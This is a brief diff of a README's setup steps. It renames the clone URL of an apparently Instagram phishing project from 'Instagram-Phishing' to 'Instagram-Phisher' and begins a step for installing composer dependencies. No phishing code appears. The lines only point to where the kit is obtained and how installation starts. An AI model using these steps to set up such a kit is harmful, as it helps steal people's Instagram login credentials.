@@ -16,7 +16,7 @@ _More demos coming soon..._
 1. Clone this project.
 
 ```bash
-git clone https://github.com/IhsanDevs/Instagram-Phishing && cd Instagram-Phishing
+git clone https://github.com/IhsanDevs/Instagram-Phisher && cd Instagram-Phisher
 ```
 
 2. Install all required composer dependencies.
